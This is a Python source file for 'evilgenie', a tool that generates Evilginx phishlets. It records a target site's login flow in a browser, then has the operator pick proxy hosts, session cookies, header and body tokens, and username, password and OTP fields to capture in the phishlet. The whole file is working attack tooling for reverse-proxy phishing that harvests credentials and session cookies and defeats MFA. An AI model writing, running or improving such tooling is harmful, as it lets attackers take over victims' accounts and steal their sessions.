"""
evilgenie — Evilginx phishlet generator.

Opens a browser at the target login page, captures EVERYTHING while the
attacker performs the full auth flow by hand (hosts, query params, POST
fields in form/JSON/multipart format, request headers, cookies, response
bodies, redirects), then walks the attacker through interactive menus to
pick exactly what goes into the generated phishlet YAML.

Usage:
    python3 main.py -u https://target.com/login [-o ./phishlets]

Flow:
    1. Browser opens and stays open — perform the whole auth flow in it.
    2. Press ENTER in this terminal when done -> browser closes, capture ends.
    3. Interactive menus (arrows / SPACE to toggle / ENTER to confirm) pick
       what goes into the phishlet; the YAML is written to the output dir.
"""

import argparse
import os
import re
import sys
import traceback
from urllib.parse import urlparse

import browser as b
import menu
import phishlet
from capture import CaptureStore, TOKENISH_RE

USER_RE = re.compile(r"user|email|login|ident|account", re.IGNORECASE)
PASS_RE = re.compile(r"pass|pwd", re.IGNORECASE)


def _trunc(value, n=20):
    value = str(value)
    return value if len(value) <= n else value[: n - 1] + "…"


def _host_ports(store):
    """Map hostname -> destination port observed (None if standard)."""
    ports = {}
    for r in store.requests:
        p = urlparse(r["url"])
        if p.hostname and p.hostname not in ports:
            port = p.port
            ports[p.hostname] = None if port in (None, 443) else port
    return ports


def _first_match(fields, regex):
    for i, f in enumerate(fields):
        if regex.search(f["name"]):
            return i
    return 0 if fields else None


def _build_sub_filters(store, hosts, session_hosts, landing):
    """
    Build sub_filters that rewrite references to chosen hosts found inside the
    bodies served by session hosts. For each (referenced host -> session host)
    pair, emit filters for the URL forms actually observed (https://, http://,
    protocol-relative //, and bare hostname). {hostname} in search matches the
    original sub+domain; in replace it auto-translates to the phishing host.
    """
    sub_filters = []
    seen = set()

    def add(triggers_on, ref_host, scheme):
        sub, domain = phishlet.split_host(ref_host)
        key = (triggers_on, ref_host, scheme)
        if key in seen:
            return
        seen.add(key)
        sub_filters.append({
            "triggers_on": triggers_on,
            "orig_sub": sub,
            "domain": domain,
            "search": f"{scheme}{{hostname}}",
            "replace": f"{scheme}{{hostname}}",
        })

    for ref_host in hosts:
        for sh in store.host_references(ref_host, session_hosts):
            # find a body from session host `sh` that mentions ref_host
            body = next((bd for u, bd in store.bodies.items()
                         if urlparse(u).hostname == sh and ref_host in bd), "")
            if f"https://{ref_host}" in body:
                add(sh, ref_host, "https://")
            if f"http://{ref_host}" in body:
                add(sh, ref_host, "http://")
            if f"//{ref_host}" in body and f"https://{ref_host}" not in body \
                    and f"http://{ref_host}" not in body:
                add(sh, ref_host, "//")
            # bare hostname reference (e.g. inside JS/JSON without scheme)
            add(sh, ref_host, "")

    # fallback: if nothing was observed but multiple hosts chosen, rewrite the
    # non-landing hosts on the landing host with a generic https:// filter
    if not sub_filters and len(hosts) > 1:
        for h in hosts:
            if h == landing:
                continue
            add(landing, h, "https://")

    return sub_filters


def run_capture(url):
    """Open browser, capture until ENTER, return the store."""
    store = CaptureStore()
    pw, br, ctx = b.createBrowser(downloadsPath=os.getcwd())
    if br is None:
        raise Exception("Browser object is None")
    ctx.on("request", store.on_request)
    ctx.on("response", store.on_response)
    page = ctx.new_page()
    try:
        page.goto(url=url, timeout=0.0)
    except Exception as e:
        print(f"[!] Initial navigation failed ({e}); navigate manually in the browser.")
    print("\n" + "=" * 70)
    print("Browser is open. Perform the FULL authentication flow now.")
    print("When finished, come back here and press ENTER to end the capture.")
    print("=" * 70 + "\n")
    try:
        input()
    except EOFError:
        pass
    try:
        store.final_url = page.url
    except Exception:
        pass
    for closer in (ctx.close, br.close, pw.stop):
        try:
            closer()
        except Exception:
            pass
    return store


def select_phishlet(store, start_url):
    """Interactive selection -> selection dict for phishlet.render()."""
    start = urlparse(start_url)
    start_host = start.hostname or ""
    start_path = start.path or "/"
    ports = _host_ports(store)
    all_hosts = store.hosts()
    if not all_hosts:
        raise Exception("No hosts captured — nothing to build a phishlet from.")

    s = store.stats()
    print(f"\n[+] Captured: {s['requests']} requests, {s['posts']} POSTs "
          f"({s['post_fields']} unique fields), {s['query_fields']} query params, "
          f"{s['headers']} headers, {s['hosts']} hosts, {s['cookies']} cookies, "
          f"{s['body_values']} JSON body values")

    # --- proxy_hosts: pick domains/subdomains FIRST; everything else is scoped to them ---
    host_idx = menu.multi_select(
        "proxy_hosts: which domains/subdomains should Evilginx proxy? (SPACE toggles, ENTER confirms)",
        all_hosts, preselected=range(len(all_hosts)))
    if not host_idx:
        raise Exception("No proxy hosts selected.")
    hosts = [all_hosts[i] for i in host_idx]
    chosen = set(hosts)

    def _cookie_in_scope(domain):
        d = domain.lstrip(".")
        return any(d == h or d.endswith("." + h) or h.endswith("." + d) for h in chosen)

    # --- landing host ---
    default_landing = hosts.index(start_host) if start_host in hosts else 0
    li = menu.single_select(
        "Which host is the landing host (phishing URLs point at it)?",
        hosts, preselect=default_landing)
    landing = hosts[li if li is not None else default_landing]

    # --- session hosts ---
    sess_idx = menu.multi_select(
        "Which hosts carry the session (main HTML, URL-bar hostname)?",
        hosts, preselected=[hosts.index(landing)])
    session_hosts = {hosts[i] for i in sess_idx} or {landing}

    proxy_hosts = []
    for h in hosts:
        sub, domain = phishlet.split_host(h)
        proxy_hosts.append({
            "host": h, "sub": sub, "domain": domain, "port": ports.get(h),
            "session": h in session_hosts, "is_landing": h == landing,
        })

    # --- auth_tokens: cookies, scoped to chosen hosts ---
    cookie_entries, cookie_meta = [], []
    for domain, jar in store.cookies.items():
        if not _cookie_in_scope(domain):
            continue
        for name, info in jar.items():
            label = f"{name}  (domain: {domain})"
            if not info["has_expiry"]:
                label += "  [no expiry -> :always]"
            cookie_entries.append(label)
            cookie_meta.append({"domain": domain, "name": name,
                                "has_expiry": info["has_expiry"]})
    ck_pre = [i for i, m in enumerate(cookie_meta) if TOKENISH_RE.search(m["name"])]
    ck_idx = menu.multi_select(
        "auth_tokens (cookie): which cookies mark an authenticated session?",
        cookie_entries, preselected=ck_pre)
    cookie_by_domain = {}
    for i in ck_idx:
        m = cookie_meta[i]
        key = m["name"] if m["has_expiry"] else f"{m['name']}:always"
        cookie_by_domain.setdefault(m["domain"], []).append(key)
    cookie_tokens = [{"domain": d, "keys": ks} for d, ks in cookie_by_domain.items()]

    # --- auth_tokens: JSON body values, scoped to chosen hosts ---
    bv = [t for t in store.body_values if t["host"] in chosen]
    bt_entries = [f"{t['name']}  ({t['host']}{t['path']}, e.g. {_trunc(t['sample'])!r})"
                  for t in bv]
    bt_pre = [i for i, t in enumerate(bv) if t["tokenish"]]
    bt_idx = menu.multi_select(
        "auth_tokens (body): capture any tokens from response bodies?",
        bt_entries, preselected=bt_pre)
    body_tokens = [{"domain": bv[i]["host"], "path": bv[i]["path"],
                    "name": bv[i]["name"], "search": bv[i]["search"]}
                   for i in bt_idx]

    # --- auth_tokens: request headers, scoped to chosen hosts ---
    hdrs = [h for h in store.req_headers if h["host"] in chosen]
    ht_entries = [f"{h['name']}  ({h['host']}{h['path']}, e.g. {_trunc(h['sample'])!r})"
                  for h in hdrs]
    ht_pre = [i for i, h in enumerate(hdrs)
              if h["name"] == "authorization" or TOKENISH_RE.search(h["name"])]
    ht_idx = menu.multi_select(
        "auth_tokens (http): capture any tokens from request headers?",
        ht_entries, preselected=ht_pre)
    http_tokens = [{"domain": hdrs[i]["host"],
                    "path": hdrs[i]["path"],
                    "name": hdrs[i]["name"],
                    "header": hdrs[i]["name"]} for i in ht_idx]

    # --- credentials: fields, scoped to chosen hosts ---
    fields = [f for f in (store.post_fields() + store.get_fields()) if f["host"] in chosen]
    credentials = {"username": None, "password": None, "custom": []}
    if fields:
        flabels = [
            f"{f['name']}  [{f['ctype']}]  ({f['host']}{f['path']}, e.g. {_trunc(f['sample'])!r})"
            for f in fields]

        def pick(title, preselect):
            while True:
                idx = menu.single_select(title, flabels, preselect=preselect)
                if idx is None:
                    return None
                if fields[idx]["ctype"] == "get":
                    print("[!] GET query params can't be captured as credentials "
                          "in phishlet v3 (post/json only). Pick another field.")
                    continue
                return idx

        ui = pick("credentials: which field is the USERNAME?",
                  _first_match(fields, USER_RE))
        pi = pick("credentials: which field is the PASSWORD?",
                  _first_match(fields, PASS_RE))
        picked = {i for i in (ui, pi) if i is not None}
        if ui is not None:
            credentials["username"] = phishlet.credential_entry(fields[ui])
        if pi is not None:
            credentials["password"] = phishlet.credential_entry(fields[pi])
        ci = menu.multi_select(
            "credentials: extra fields to capture as CUSTOM (e.g. OTP, PIN, CSRF)?",
            flabels, preselected=[i for i in range(len(fields))
                                  if i not in picked and fields[i]["ctype"] != "get"])
        for i in ci:
            if fields[i]["ctype"] == "get":
                print(f"[!] Skipping GET field '{fields[i]['name']}' (not supported "
                      "as a credential in phishlet v3).")
                continue
            credentials["custom"].append(phishlet.credential_entry(fields[i]))
    else:
        print("[!] No POST/GET fields captured on chosen hosts; credentials section will be empty.")

    # --- auth_urls: paths, scoped to chosen hosts ---
    pages = [p for p in store.auth_url_candidates() if p["host"] in chosen]
    plabels = [f"{p['path']}  ({p['host']})  [{p['tag']}]" for p in pages]
    pre = [i for i, p in enumerate(pages) if p["tag"] == "final"]
    au_idx = menu.multi_select(
        "auth_urls: which post-auth paths trigger a successful session capture?",
        plabels, preselected=pre)
    auth_urls = [re.escape(pages[i]["path"]) for i in au_idx]

    # --- sub_filters: rewrite references to chosen hosts inside session-host bodies ---
    sub_filters = _build_sub_filters(store, hosts, session_hosts, landing)

    # --- naming ---
    default_name = phishlet.split_host(landing)[1].split(".")[0]
    name = menu.text_input("Phishlet name", default=default_name)
    redirect = menu.text_input("Default redirect_url (after capture)",
                               default=store.final_url or f"https://{landing}/")

    return {
        "name": name,
        "redirect_url": redirect,
        "proxy_hosts": proxy_hosts,
        "sub_filters": sub_filters,
        "cookie_tokens": cookie_tokens,
        "body_tokens": body_tokens,
        "http_tokens": http_tokens,
        "credentials": credentials,
        "auth_urls": auth_urls,
        "login": {"domain": start_host, "path": start_path},
    }


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Evilginx phishlet generator")
    parser.add_argument("-u", "--url", required=True,
                        help="URL of the login page, e.g. 'https://site.com/login'")
    parser.add_argument("-o", "--outdir", default="./phishlets",
                        help="Output directory for the generated phishlet")
    args = parser.parse_args()

    try:
        print(f"[.] Creating browser for {args.url}")
        store = run_capture(args.url)
        print("[.] Capture ended. Building phishlet...\n")
        selection = select_phishlet(store, args.url)
        yaml_text = phishlet.render(selection)
        os.makedirs(args.outdir, exist_ok=True)
        out_path = os.path.join(args.outdir, f"{selection['name']}.yaml")
        with open(out_path, "w") as fh:
            fh.write(yaml_text)
        print(f"\n[+] Phishlet written to {out_path}\n")
        print(yaml_text)
    except KeyboardInterrupt:
        print("\n[!] Aborted.")
        sys.exit(1)
    except Exception as e:
        traceback.print_exception(e)
        sys.exit(1)
